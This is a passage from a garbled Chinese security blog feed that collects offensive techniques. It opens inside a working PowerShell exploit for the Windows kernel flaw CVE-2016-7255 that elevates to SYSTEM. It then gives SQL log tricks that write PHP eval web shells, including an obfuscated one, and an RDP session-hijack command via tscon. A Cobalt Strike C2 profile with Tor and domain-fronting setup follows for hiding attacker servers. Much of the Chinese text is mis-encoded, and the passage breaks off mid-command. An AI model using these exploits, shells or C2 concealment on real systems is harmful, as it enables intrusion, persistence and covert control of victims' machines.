($([ms16135]::GetMessage([ref]$tagMSG,[IntPtr]::Zero,0,0))) &#123; $CallResult = [ms16135]::SetFocus($hWndParent) # for ($i=0;$i-lt20;$i++)&#123;Do-AltShiftEsc&#125; # $CallResult = [ms16135]::SetFocus($hWndChild) # Bug triggers here! for ($i=0;$i-lt20;$i++)&#123;Do-AltShiftEsc&#125; # $CallResult = [ms16135]::TranslateMessage([ref]$tagMSG) $CallResult = [ms16135]::DispatchMessage([ref]$tagMSG) &#125; &#125; $SafeGuard.Stop() &#125; [IntPtr]$Global:BytePointer = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40) do &#123; echo "[+] Trying to trigger arbitrary 'Or'.." $ByteRead = [ms16135]::GetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer) Trigger-Write $LoopCount += 1 &#125; while ($ByteRead -ne 0x2000 -And $LoopCount -lt 10) # Clean up $CallResult = [ms16135]::DestroyWindow($hWndChild) $CallResult = [ms16135]::DestroyWindow($hWndParent) $CallResult = [ms16135]::UnregisterClass("cve-2016-7255",[IntPtr]::Zero) # Because shit happens, or patched if ($LoopCount -eq 10) &#123; echo "`n[!] Bug did not trigger, try again or patched?`n" $Script:BugNotTriggered = 1 &#125;&#125;Do-OrAddress -Address $TargetAddressif ($BugNotTriggered) &#123; Return&#125;#==============================================================[Set pvScan0 Manger]# Calculate offsetif ($OSMajorMinor -eq "6.1") &#123; $SizeVal = 0x400000770&#125; else &#123; $SizeVal = 0x400000760&#125;do &#123; $Read64 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount) if ($Read64 -eq $SizeVal) &#123; $Pointer1 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 16) $Pointer2 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 24) if ($Pointer1 -eq $Pointer2) &#123; $BufferOffset = $LoopCount + 16 Break &#125; &#125; $LoopCount += 8&#125; while ($LoopCount -lt 0x2000)$pvBits = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset)$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)# Sanity check, probably unnecessaryif ($pvScan0 -ne 0) &#123; echo "`n[?] Success, reading beyond worker bitmap size!" echo "[+] Old manager bitmap pvScan0: $('&#123;0:X&#125;' -f $pvScan0)"&#125; else &#123; echo "`n[!] Buffer contains invalid data, quitting..`n" Return&#125;# Overwrite pointers in buffer[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset),$WorkerBitmap.BitmappvScan0)[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset + 8),$WorkerBitmap.BitmappvScan0)$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)echo "[+] New manager bitmap pvScan0: $('&#123;0:X&#125;' -f $pvScan0)"# Overwrite adjacent kernel _SURFOBJ$CallResult = [ms16135]::SetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)#==============================================================[Elevate]Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandleif([String]::IsNullOrEmpty($Application))&#123;Write-Host "[!] Nothing to do.." &#125;else&#123;cmd /c $Application + " " + $Commandline&#125;&#125; githubåœ°å€ï¼šæˆ³æˆ‘demo:]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLè¯­å¥åˆ©ç”¨æ—¥å¿—å†™shell]]></title>
    <url>%2Farchives%2Ftest1.html</url>
    <content type="text"><![CDATA[outfileè¢«ç¦æ­¢ï¼Œæˆ–è€…å†™å…¥æ–‡ä»¶è¢«æ‹¦æˆªï¼› åœ¨æ•°æ®åº“ä¸­æ“ä½œå¦‚ä¸‹ï¼šï¼ˆå¿…é¡»æ˜¯rootæƒé™ï¼‰ 1234567show variables like '%general%'; #æŸ¥çœ‹é…ç½®set global general_log = on; #å¼€å¯general logæ¨¡å¼set global general_log_file = '/var/www/html/1.php'; #è®¾ç½®æ—¥å¿—ç›®å½•ä¸ºshellåœ°å€select '&lt;?php eval($_POST[cmd]);?&gt;' #å†™å…¥shell SQLæŸ¥è¯¢å…æ€shellçš„è¯­å¥1SELECT "&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;" åŸæ–‡ï¼šæˆ³æˆ‘]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windowsåˆ‡æ¢å…¶ä»–ç™»é™†ç”¨æˆ·]]></title>
    <url>%2Farchives%2Fchange_user.html</url>
    <content type="text"><![CDATA[æŸ¥çœ‹ç”¨æˆ·:123456C:\Windows\system32&gt;query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME administrator 1 Disc 1 3/12/2017 3:07 PM&gt;localadmin rdp-tcp#55 2 Active . 3/12/2017 3:10 PMC:\Windows\system32&gt; åˆ›å»ºæœåŠ¡ï¼š12C:\Windows\system32&gt;sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"[SC] CreateService SUCCESS å¯åŠ¨æœåŠ¡ï¼š1net setart sesshijack ç»†èŠ‚ï¼šhttp://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[URL é‡‡é›†(Google)]]></title>
    <url>%2Farchives%2FURL.html</url>
    <content type="text"><![CDATA[google:12345var h3 = document.getElementsByTagName('h3');for(var i=0;i&lt;h3.length;i++)&#123; var a = h3[i]. getElementsByTagName('a'); console.log(a[0].href);&#125; bing:12345var h3 = document.getElementsByTagName('h2');for(var i=0;i&lt;h3.length;i++)&#123; var a = h3[i]. getElementsByTagName('a'); console.log(a[0].href);&#125;]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[éšåŒ¿çš„æ”»å‡»ä¹‹-Tor Fronting]]></title>
    <url>%2Farchives%2FTor_Fronting.html</url>
    <content type="text"><![CDATA[æ–‡ç« ç¬¬ä¸€æ—¶é—´å‘å¸ƒåœ¨www.4hou.comã€‚æ–‡ç« å·²æˆæƒå˜¶å¼ç‹¬å®¶å‘å¸ƒï¼Œæœªç»è®¸å¯ç¦æ­¢è½¬è½½ï¼Œå¦‚è‹¥è½¬è½½è¯·è”ç³»å˜¶å¼ç¼–è¾‘ 0x01 ç®€ä»‹å­¦ä¹ å®ŒDomain Frontingä¹‹åï¼Œåˆä»@vysecurityçš„æ–‡ç« é‡Œå­¦ä¼šäº†ä¸€ä¸ªæ–°çš„å§¿åŠ¿â€“Tor Fronting,ä½¿ç”¨Tor FrontingåŒæ ·èƒ½åœ¨æ”»å‡»ä¸­éšè—è‡ªå·±ï¼Œå¹¶ä¸”æ›´åŠ å®¹æ˜“å®ç°ï¼Œæ­¤æ–‡å°±æ¥ä»‹ç»ä¸€ä¸‹è¿™ä¸ªæ–°çš„å§¿åŠ¿ã€‚ 0x02 Tor Hidden ServicesToræ˜¯äº’è”ç½‘ä¸Šç”¨äºä¿æŠ¤æ‚¨éšç§æœ€æœ‰åŠ›çš„å·¥å…·ä¹‹ä¸€ï¼Œè€ŒTor Hidden Servicesåˆ™æ˜¯ä¸ºäº†éšè—è‡ªå·±çš„ç½‘ç«™æˆ–è€…å…¶ä»–æœåŠ¡çš„ä¸€ä¸ªæœåŠ¡ã€‚é€šè¿‡æ­¤æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä¸€ä¸ªé€šè¿‡Tor Browseræ¥è®¿é—®çš„Hostnameï¼Œæ­¤Hostnameå”¯ä¸€ä¸”åŒ¿åï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªHostnameæ¥ä¸ºæˆ‘ä»¬è½¬å‘æµé‡ä»è€Œè¾¾åˆ°éšåŒ¿çš„ç›®çš„ã€‚ æ€æ ·æ­å»ºTor Hidden Serviceså¯ä»¥å‚è€ƒæ­¤wikiï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹æˆ‘æµ‹è¯•ç¯å¢ƒçš„æ­å»ºè¿‡ç¨‹ã€‚ç¯å¢ƒä¸ºï¼šUbuntu 12.04æ­å»ºè¿‡ç¨‹å¦‚ä¸‹ï¼šæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯:1lsb_release -a å¯ä»¥çœ‹åˆ°Codenameä¸ºpreciseï¼Œæ‰€ä»¥åœ¨è¿™é‡Œé€‰æ‹©debç±»å‹å¦‚ä¸‹ï¼š ä¹‹åæŒ‰ç…§å®˜æ–¹wikiä¿®æ”¹æ›´æ–°æºï¼Œæˆ‘çš„æºè·¯å¾„ä¸º/etc/apt/sources.listï¼Œæœ‰çš„ç³»ç»Ÿæ›´æ–°æºè·¯å¾„å¯èƒ½åœ¨/etc/apt/sources.list.d/ï¼Œåœ¨æºä¸­æ·»åŠ ä»¥ä¸‹æ¡ç›®ï¼š12deb http://deb.torproject.org/torproject.org precise maindeb-src http://deb.torproject.org/torproject.org precise main ä¹‹åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤:12gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add - å®‰è£…ï¼š12$ sudo apt-get update$ sudo apt-get install tor deb.torproject.org-keyring æ‰§è¡Œå®Œæˆä»¥åï¼Œå°±æˆåŠŸå®‰è£…äº†ï¼Œå¦‚æœå‡ºç°é—®é¢˜ï¼Œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹wikiã€‚ ä¹‹åè¦å¯¹torè¿›è¡Œä¸€ä¸‹é…ç½®ï¼Œç¼–è¾‘é…ç½®æ–‡ä»¶/etc/tor/torrcï¼Œå°†ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°å‰çš„æ³¨é‡Šå»æ‰ã€‚12HiddenServiceDir /var/lib/tor/hidden_service/HiddenServicePort 80 127.0.0.1:8080 HiddenServicePortä¸ºä»£ç†çš„ç«¯å£ï¼Œå°†æœ¬åœ°çš„8080ç«¯å£æœåŠ¡è½¬å‘åˆ°80ç«¯å£ã€‚ é…ç½®å®Œæˆä»¥åå¯¹ToræœåŠ¡è¿›è¡Œé‡å¯ï¼š1sudo service tor restart æŸ¥çœ‹è·å–åˆ°çš„hostname:1sudo cat /var/lib/tor/hidden_service/hostname å…¶ä¸­xxxxx.onionåˆ™ä¸ºæˆ‘ä»¬çš„Toréšè—æœåŠ¡ã€‚é€šè¿‡è®¿é—®è¿™ä¸ªåœ°å€ï¼Œå¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬æœåŠ¡å™¨8080ç«¯å£çš„æœåŠ¡ï¼Œä¸‹é¢è¿›è¡Œä¸€ä¸‹æµ‹è¯•ã€‚å¼€å¯8080ç«¯å£çš„æœåŠ¡ï¼š123â˜ ~ cd /tmpâ˜ ~ python -m SimpleHTTPServer 8080Serving HTTP on 0.0.0.0 port 8080 ... ä½¿ç”¨toræµè§ˆå™¨è®¿é—®æ­¤åŸŸåï¼Œå¯çœ‹åˆ°8080ç«¯å£çš„å“åº”ï¼š 0x03 Tor2Webè¦å¯¹è¿™ä¸ªéšè—serverè¿›è¡Œåˆ©ç”¨ï¼Œéœ€è¦å€ŸåŠ©äºä¸€ä¸ªä»£ç†ï¼Œå³tor2webï¼Œå› ä¸ºè¦æƒ³è®¿é—®åˆ°éšè—æœåŠ¡ï¼Œç›´æ¥é€šè¿‡ä¸€èˆ¬æµè§ˆå™¨æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥å€ŸåŠ©äºtor2webï¼Œéœ€è¦åšçš„ä¹Ÿå¾ˆç®€å•ï¼Œå½“æˆ‘ä»¬è®¿é—®å½¢å¦‚http://duskgytldkxiuqc6.onion/çš„é“¾æ¥æ—¶ï¼Œç›´æ¥ä¿®æ”¹.onionæˆ.onion.toæˆ–.onion.city æˆ– onion.cab æˆ–è€…ä»»ä½•ä¸€ä¸ªæä¾›æ­¤æœåŠ¡çš„åŸŸåå³å¯ã€‚å¦‚ä¸‹å›¾ï¼š å½“ç„¶ï¼Œè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è®¿é—®çš„æ—¶å€™ï¼Œä¼šéœ€è¦æˆ‘ä»¬ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®æ‰èƒ½æ­£å¸¸è®¿é—®ï¼Œå¦‚ä¸‹å›¾ï¼š é‚£ä¹ˆæ€ä¹ˆæ ·æ‰èƒ½ç›´æ¥è®¿é—®å‘¢ï¼Œå¾ˆç®€å•ï¼Œåªéœ€è¦å¸¦ä¸Šç‚¹å‡»ä»¥åçš„cookieå°±å¯ä»¥äº†ï¼Œæµ‹è¯•å¦‚ä¸‹ï¼š1curl -b 'onion_cab_iKnowShit=yourcookie' 'https://xxxx.onion.cab/1.txt' 0x04 Cobalt StrikeåŒæ ·çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨Cobalt Strikeæ¥è¿›è¡Œæµ‹è¯•ã€‚è¿™é‡Œéœ€è¦é…ç½®ä¸€ä¸ªæ–°çš„profileï¼Œ@vysecurityå·²ç»æä¾›äº†ä¸€ä¸ªï¼Œå…·ä½“å¦‚ä¸‹ï¼štor-fronting.profile123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# make our C2 look like a Google Web Bug# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting## Author: @armitagehacker# Modified by Vincent Yiu @vysecurity for TOR.set sleeptime "5000";http-get &#123; set uri "/___utm"; client &#123; header "Host" "bjaw6h36vwruhwvb.onion.cab"; header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"; metadata &#123; base64url; prepend "__utma"; parameter "utmcc"; &#125; &#125; server &#123; header "Content-Type" "plain/text"; output &#123; # hexdump pixel.gif # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00 # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00 # 0000020 01 00 01 00 00 02 01 44 00 3b prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;http-post &#123; set uri "/__utm"; set verb "GET"; client &#123; header "Host" "bjaw6h36vwruhwvb.onion.cab"; header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"; id &#123; prepend "UA-220"; append "-2"; parameter "utmac"; &#125; output &#123; base64url; prepend "__utma"; parameter "utmcc"; &#125; &#125; server &#123; header "Content-Type" "plain/text"; output &#123; prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;# dress up the staging process toohttp-stager &#123; server &#123; header "Content-Type" "plain/text"; &#125;&#125; åœ¨è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹Getä»¥åŠPostä¸­çš„HoståŠCookieä¸ºè‡ªå·±çš„ã€‚å½“ç„¶ï¼Œå¦‚æœä½ æƒ³è®©æ•°æ®åŒ…å‘ˆç°åˆ«çš„æ ·å­ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±å†å†™ä¸€ä¸ªprofileã€‚ å¼€å¯teamserverï¼š1â˜ cobal sudo ./teamserver [your ip] hacktest tor-fronting.profile è¿æ¥åˆ°Teamserverï¼Œä¹‹ååˆ›å»ºç›‘å¬ï¼š å› ä¸ºonion.cabä½¿ç”¨çš„httpsï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ªHTTPS Beaconï¼ŒHostéšæ„è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œç«¯å£ä¸€å®šè¦æ”¹æˆ443ã€‚ ä½¿ç”¨onion.cab: ç”ŸæˆHTTPS Beaconï¼š ç”ŸæˆHTTPS Beaconä»¥åï¼Œè¦ä¿®æ”¹ç›‘å¬åˆ°8080ç«¯å£ï¼Œå¹¶ä¸”ä½¿ç”¨HTTPï¼Œå› ä¸ºè¿™æ˜¯torè½¬å‘çš„æœåŠ¡ã€‚é€‰æ‹©Editï¼šä¿®æ”¹å‚æ•°å¦‚ä¸‹ï¼šä¿å­˜ä¹‹åï¼Œè¿è¡ŒHTTPS beaconï¼ŒæˆåŠŸä¸Šçº¿ï¼š DEMO: https://www.youtube.com/watch?v=I3ovfrqcF0I 0x05 å°ç»“ä½¿ç”¨Tor Fronting æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š1ã€ä½ ä¸éœ€è¦å¤–ç½‘ç¯å¢ƒï¼Œå°†C2æ”¾åˆ°Dockeræˆ–è€…æœ¬åœ°éƒ½å¯ä»¥ï¼ï¼ˆä½†æ˜¯éœ€è¦æœåŠ¡å™¨åœ¨å¢™å¤–ï¼‰2ã€ä½¿C2åŒ¿åï¼›3ã€å¹¶ä¸éœ€è¦åœ¨ç›®æ ‡æœºä¸Šå®‰è£…Torï¼›4ã€é»˜è®¤æ˜¯å®‰å…¨çš„ã€‚5ã€è¦æ±‚C2ä¸ŠåŒæ—¶å®‰è£…Cobalt StrikeåŠToræœåŠ¡ã€‚é€šè¿‡æµé‡è½¬å‘æ¥éšè—è‡ªå·±çš„çœŸæ­£æœåŠ¡å™¨æ˜¯éšè—çš„å…³é”®ï¼Œè€Œå¦‚ä½•å¯»æ‰¾è½¬å‘å’Œæ€ä¹ˆæ ·ä½¿ç”¨å®ƒæ˜¯å¾ˆæœ‰è¶£çš„è¿‡ç¨‹ï¼Œå¸Œæœ›æ–‡ç« èƒ½ç»™ä½ æœ‰æ‰€å¯å‘ã€‚ 0x06 å‚è€ƒ1ã€https://www.torproject.org/docs/tor-hidden-service.html.en2ã€https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/3ã€https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html4ã€https://www.tor2web.org/]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>tor fronting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[éšåŒ¿çš„æ”»å‡»ä¹‹-Domain Fronting]]></title>
    <url>%2Farchives%2FDomain_Fronting.html</url>
    <content type="text"><![CDATA[0x01 ç®€ä»‹æœ€è¿‘çœ‹åˆ°äº†ä¸€äº›å…³äºDomain Frontingçš„æŠ€æœ¯ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€ï¼Œå…¶ç‰¹ç‚¹åœ¨äºï¼Œä½ çœŸæ­£è®¿é—®çš„åŸŸåå¹¶ä¸æ˜¯ä½ çœ‹åˆ°çš„åŸŸåï¼Œå³å¯ä»¥éšè—æ”»å‡»è€…çš„çœŸå®åœ°å€ï¼Œå¹¶ä¸”æ­¤æŠ€æœ¯èƒ½å¤Ÿè®©æˆ‘ä»¬åœ¨ä¸€äº›å—é™åˆ¶çš„ç½‘ç»œä¸­ä¾ç„¶è¿æ¥åˆ°æˆ‘ä»¬çš„C2æœåŠ¡å™¨ï¼Œå…¶å…³é”®æ€æƒ³æ˜¯åœ¨ä¸åŒçš„é€šä¿¡å±‚ä½¿ç”¨ä¸åŒçš„åŸŸåï¼Œåœ¨HTTP(S)è¯·æ±‚ä¸­ï¼Œç›®æ ‡åŸŸåé€šå¸¸æ˜¾ç¤ºåœ¨ä¸‰ä¸ªå…³é”®ä½ç½®ï¼šDNSæŸ¥è¯¢ï¼ŒTLSï¼ˆSNIï¼‰æ‹“å±•åŠHTTPä¸»æœºå¤´ä¸­ï¼Œé€šå¸¸ï¼Œè¿™ä¸‰ä¸ªåœ°æ–¹éƒ½ä¼šæ˜¯æˆ‘ä»¬è¦è®¿é—®çš„åŸŸååœ°å€ï¼Œç„¶è€Œï¼Œåœ¨â€Domain Frontingâ€è¯·æ±‚ä¸­ï¼ŒDNSæŸ¥è¯¢ä»¥åŠSNIæºå¸¦äº†ä¸€ä¸ªåŸŸåï¼ˆå‰åŸŸï¼‰ï¼Œè€Œåœ¨HTTP hostå¤´ä¸­æºå¸¦äº†å¦ä¸€ä¸ªåŸŸåï¼ˆéšè”½çš„ï¼Œè¢«ç¦æ­¢è®¿é—®çš„åŸŸåï¼‰ï¼Œç®€å•çš„å›¾ä¾‹å¦‚ä¸‹: é€šå¸¸æ£€æŸ¥å™¨ä¸èƒ½é˜»æ­¢DNSåŠSNIä¸­è¯·æ±‚çš„å†…å®¹ï¼Œè€ŒHOSTå¤´å¯¹æ£€æŸ¥å™¨ä¸å¯è§ï¼Œä½†å¯¹æ¥æ”¶HTTP(S)è¯·æ±‚çš„å‰ç«¯æœåŠ¡å™¨å¯è§ï¼Œè€Œå‰ç«¯æœåŠ¡å™¨ï¼Œåœ¨å†…éƒ¨è¯·æ±‚HTTPå¤´ä¸­çš„Hostçš„åœ°å€ï¼Œè¿›è€Œè¾¾åˆ°éšè”½ç›®çš„åœ°çš„ç›®çš„ã€‚å…³äºDomain Fronting è¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« æœ‰è¯¦ç»†çš„ä»‹ç»ã€ŠBlocking-resistant communication through domain frontingã€‹ã€‚æœ¬æ–‡å°±ä¸åœ¨è¯¦ç»†ä»‹ç»äº†ã€‚æ„Ÿè§‰è¿™ä¸ªæŠ€æœ¯å¾ˆæœ‰è¶£ï¼Œæ‰€ä»¥å°±å¯¹æ­¤æŠ€æœ¯è¿›è¡Œäº†ä¸€ä¸‹ç ”ç©¶ä¸å­¦ä¹ ï¼Œå¹¶å†™æ­¤æ–‡è¿›è¡Œåˆ†äº«ã€‚ 0x02 æƒ…å½¢æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šé‡åˆ°è¿™ç§æƒ…å½¢ï¼Œå³ç½‘ç»œä¸­éƒ¨ç½²äº†å¾ˆå¤šé˜²å¾¡æ–¹æ¡ˆï¼Œæ¯”å¦‚é˜²ç«å¢™å¼€å¯IDPï¼ŒIPSï¼ŒIDSç­‰ï¼Œè¿™äº›æ–¹æ¡ˆå¯ç”¨äºé™åˆ¶ç½‘ç»œå‡ºç«™è§„åˆ™ï¼Œä¾‹å¦‚ï¼Œä»…ä»…å…è®¸TCP 80åŠ443é€šè¿‡ä»£ç†ç¦»å¼€ç½‘ç»œï¼Œå¹¶ä¸”è¿˜ä¼šæœ‰è®¸å¤šè®¾å¤‡åœ¨åº”ç”¨å±‚æ¥æ£€æŸ¥è¿™ä¸ªæµé‡ï¼Œå¦‚æœæ£€æµ‹åˆ°æ¶æ„çš„Payloadï¼Œåˆ™è¿›è¡Œæ‹¦æˆªå¹¶æŠ¥è­¦ã€‚ç»•è¿‡è¿™äº›è§£å†³æ–¹æ¡ˆä¸€ç›´æ˜¯å…¥ä¾µè€…ä¸é˜²å¾¡è€…ä¹‹é—´çš„åšå¼ˆï¼Œé˜²å¾¡è€…åŠªåŠ›çš„æƒ³æ€ä¹ˆæ‹¦ï¼Œè€Œå…¥ä¾µè€…åœ¨åŠªåŠ›çš„æƒ³æ€ä¹ˆç»•ã€‚å› æ­¤ä¹Ÿæœ‰äº†å¾ˆå¤šå¾ˆå¤šçš„æ”»å‡»æŠ€æœ¯ï¼Œæ¯”å¦‚DNSéš§é“ï¼ŒICMPéš§é“ç­‰ç­‰ã€‚æœ€è¿‘æœ‰ä¸€ç¯‡æ–‡ç« ã€ŠDoodles, stickers, and censorship circumvention for Signal Androidã€‹ä»‹ç»äº†é€šè¿‡Domain Frontingæ¥ç»•è¿‡ä¿¡å·é™åˆ¶çš„æ–¹å¼ï¼Œåœ¨æ­¤æ–‡ä¸­æŒ‡å‡ºâ€œè®¸å¤šæµè¡Œçš„æœåŠ¡å’ŒCDNï¼ˆå¦‚Googleï¼ŒAmazon Cloudfrontï¼ŒAmazon S3ï¼ŒAzureï¼ŒCloudFlareï¼ŒFastlyå’ŒAkamaiï¼‰å¯ä»¥ä»¥ä¸€ç§æ–¹å¼è·å–ä¿¡å·ï¼Œè¿™ç§æ–¹å¼çœ‹èµ·æ¥ä¸å…¶ä»–æœªç»å®¡æŸ¥çš„æµé‡ä¸å¯è¾¨åˆ«ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ­¤æŠ€æœ¯æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤è§„åˆ™ã€‚ 0x03 ç¤ºä¾‹è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Amazonâ€™s CloudFrontä½œä¸ºä¸€ä¸ªæ¼”ç¤ºï¼ŒCloudFrontæ˜¯ä¸€ç§å†…å®¹äº¤ä»˜ç½‘ç»œæœåŠ¡ã€‚å®ƒä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªå…¨å±€åˆ†å¸ƒå¼ç¼“å­˜ï¼Œç”¨äºæ‰˜ç®¡åœ¨å…¶æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚è¿™å‡å°‘äº†å®¢æˆ·æœåŠ¡å™¨ä¸Šçš„è´Ÿè½½ï¼Œå¹¶å…è®¸CDNæä¾›æ¥è‡ªä¸è¯·æ±‚è€…æ•°æ®ä¸­å¿ƒçš„ç¼“å­˜å†…å®¹ï¼Œå½“å®¢æˆ·ç«¯è¿æ¥åˆ°CloudFrontçš„æ—¶å€™ï¼Œå…¶æ ¹æ®HOSTå¤´æ¥åˆ¤æ–­å®¢æˆ·ç«¯æƒ³è¦è¯·æ±‚çš„åŸŸåï¼Œé¦–å…ˆåœ¨Amazonâ€™s CloudFrontæ³¨å†Œè´¦å·ï¼Œä¹‹åæŒ‰ä»¥ä¸‹æ­¥éª¤å»ºç«‹è‡ªå·±çš„CloudFrontï¼šä¸€ã€é€‰æ‹©æœåŠ¡ï¼ŒCloudFront äºŒã€æ–°å»ºèŠ‚ç‚¹ ä¸‰ã€é…ç½®èŠ‚ç‚¹ å¡«å…¥è‡ªå·±çš„åŸŸåï¼Œå¹¶æŠŠOrigin Protocol Policyé…ç½®ä¸ºMatch Viewer ä¿®æ”¹ç®­å¤´å‡ å¤„å€¼ å…¶ä»–é»˜è®¤ï¼Œç‚¹å‡»åˆ›å»ºã€‚æˆåŠŸå¦‚ä¸‹å›¾ï¼š evi1cg.meä¸ºæŒ‡å‘æµ‹è¯•C2æœåŠ¡å™¨çš„åŸŸåï¼Œä¸‹é¢ä½¿ç”¨wgetæ¥è¿›è¡Œæµ‹è¯•ã€‚12wget -U demo -q -O - https://evi1cg.github.io/foo.txthello there ! d289wv3b5uz3me.cloudfront.netä¸ºæˆ‘çš„CloudFrontï¼Œå¯¹è¿™ä¸ªåŸŸåçš„è®¿é—®å¯è®¿é—®åˆ°evi1cg.meçš„IPã€‚12wget -U demo -q -O - http://d289wv3b5uz3me.cloudfront.net/foo.txthello there ! å¦‚ä¸‹å›¾ï¼š ç°åœ¨æˆ‘ä»¬æ¥ä¼ªé€ ä¸»æœºå¤´æ¥è¯•è¯•çœ‹ã€‚è¿™é‡Œä½¿ç”¨a0.awsstatic.comï¼Œæ­¤åŸŸåæ¥è‡ªäºè¿™é‡Œã€‚ç›´æ¥è®¿é—®ä¸ä¼šèŒƒå›´ä»»ä½•ä¸œè¥¿ï¼š1wget -U demo -q -O - http://a0.awsstatic.com/foo.txt ä¿®æ”¹Hostå¤´ï¼Œä¼ªé€ Hostä¸ºæˆ‘ä»¬åˆ›å»ºçš„CloudFrontæ‰€åˆ†å‘çš„FQDNï¼Œè¿™æ ·å°±è¿”å›äº†æˆ‘ä»¬è¦è®¿é—®çš„æ–‡ä»¶ï¼š1wget -U demo -q -O - http://a0.awsstatic.com/foo.txt --header "Host: d289wv3b5uz3me.cloudfront.net" å¦‚ä¸‹å›¾ï¼š è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨é«˜ä¿¡èª‰åŸŸåæ¥ä»£æ›¿æˆ‘ä»¬è‡ªå·±çš„åŸŸåäº†ã€‚ é‚£ä¹ˆå¦‚ä½•å¯»æ‰¾ç±»ä¼¼äºa0.awsstatic.comè¿™æ ·çš„é«˜ä¿¡èª‰åŸŸåå‘¢ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªç®€å•çš„å‘½ä»¤æ¥å¯»æ‰¾ï¼š1for i in &#123;a..z&#125;; do for j in &#123;0..9&#125;; do wget -U demo -q -O - http://$i$j.awsstatic.com/foo.txt --header "Host: 